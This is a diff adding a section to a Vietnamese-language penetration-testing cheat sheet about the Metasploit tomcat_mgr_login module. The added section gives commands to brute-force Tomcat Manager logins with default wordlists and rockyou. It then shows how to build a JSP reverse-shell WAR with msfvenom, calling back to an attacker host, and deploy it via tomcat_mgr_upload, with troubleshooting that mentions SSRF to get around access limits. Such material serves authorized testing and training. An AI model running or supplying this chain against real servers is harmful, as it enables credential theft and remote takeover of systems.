@@ -11,6 +11,7 @@
 | [WPVulnDB](#wpvulndb) | Database lỗ hổng WordPress — tra cứu CVE theo plugin/theme/core version | Research / Exploitation |
 | [Metasploit](#metasploit) | Framework khai thác lỗ hổng — tích hợp exploit, payload, post-exploitation | Exploitation / Post-Exploitation |
 | [msfvenom](#msfvenom) | Tạo payload độc lập — reverse shell, bind shell, webshell cho mọi nền tảng | Exploitation |
+| [tomcat_mgr_login](#module-tomcat_mgr_login) | Brute force credential Tomcat Manager — tìm tài khoản đăng nhập /manager/html | Reconnaissance / Exploitation |
 
 ---
 
@@ -1165,6 +1166,120 @@ set PAYLOAD php/meterpreter_reverse_tcp
 # → Kiểm tra firewall attacker machine
 # → Thử dùng reverse_tcp thay vì bind_tcp
 # → Kiểm tra LHOST đúng IP interface không
+```
+
+---
+
+## Module tomcat_mgr_login
+
+**Module path:** `auxiliary/scanner/http/tomcat_mgr_login`
+**Loại:** Credential Brute Force / Scanner
+**Yêu cầu:** Truy cập được Tomcat Manager (`/manager/html`)
+
+### Cơ chế hoạt động
+
+```
+1. Gửi HTTP request đến /manager/html với Basic Auth header
+2. Thử từng cặp username:password từ wordlist
+3. HTTP 200 → credential hợp lệ
+4. HTTP 401 → sai credential, thử tiếp
+5. Báo cáo credential tìm được → dùng để deploy WAR shell
+```
+
+### Sử dụng
+
+```bash
+# [ATTACKER] — trong msfconsole
+use auxiliary/scanner/http/tomcat_mgr_login
+
+show options
+```
+
+```
+Module options:
+
+  NAME              REQUIRED  DESCRIPTION
+  ----              --------  -----------
+  BLANK_PASSWORDS   no        Thử password rỗng
+  BRUTEFORCE_SPEED  no        Tốc độ brute force (0-5, mặc định 5)
+  PASSWORD          no        Password cụ thể
+  PASS_FILE         no        File wordlist password
+  Proxies           no        Proxy chain
+  RHOSTS            yes       Target host(s)
+  RPORT             yes       Target port (mặc định 8080)
+  SSL               no        Dùng SSL/TLS
+  STOP_ON_SUCCESS   no        Dừng khi tìm được credential đầu tiên
+  TARGETURI         yes       Đường dẫn Tomcat Manager (mặc định /manager/html)
+  USERNAME          no        Username cụ thể
+  USER_FILE         no        File wordlist username
+  VHOST             no        Virtual host
+```
+
+```bash
+set RHOSTS 192.168.1.10
+set RPORT 8080
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+set STOP_ON_SUCCESS true
+run
+```
+
+### Wordlist mặc định của Metasploit
+
+```bash
+/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
+/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+
+# Hoặc dùng wordlist tổng hợp
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+```
+
+### Ví dụ output thành công
+
+```
+[*] 192.168.1.10:8080 - Attempting to login to http://192.168.1.10:8080/manager/html
+[-] 192.168.1.10:8080 - LOGIN FAILED: admin:admin (Incorrect)
+[+] 192.168.1.10:8080 - Login Successful: tomcat:s3cret
+[*] Auxiliary module execution completed
+```
+
+### Sau khi có credential → Deploy WAR shell
+
+```bash
+# Bước 1 — Tạo WAR payload
+msfvenom -p java/jsp_shell_reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f war -o shell.war
+
+# Bước 2 — Deploy qua tomcat_mgr_upload
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS 192.168.1.10
+set RPORT 8080
+set HttpUsername tomcat
+set HttpPassword s3cret
+set LHOST 192.168.1.100
+set LPORT 4444
+run
+
+# Hoặc deploy thủ công qua trình duyệt
+# http://192.168.1.10:8080/manager/html → WAR file to deploy → Upload shell.war
+```
+
+### Troubleshooting
+
+```bash
+# Lỗi: tất cả đều 401
+# → Kiểm tra TARGETURI — một số Tomcat dùng /manager/text
+set TARGETURI /manager/text
+
+# Lỗi: 403 Forbidden
+# → Tomcat chặn truy cập Manager từ IP ngoài localhost
+# → Cần truy cập từ localhost hoặc qua SSRF
+
+# Thử credential mặc định nhanh
+set USERNAME tomcat
+set PASSWORD tomcat
+run
 ```
 
 ---
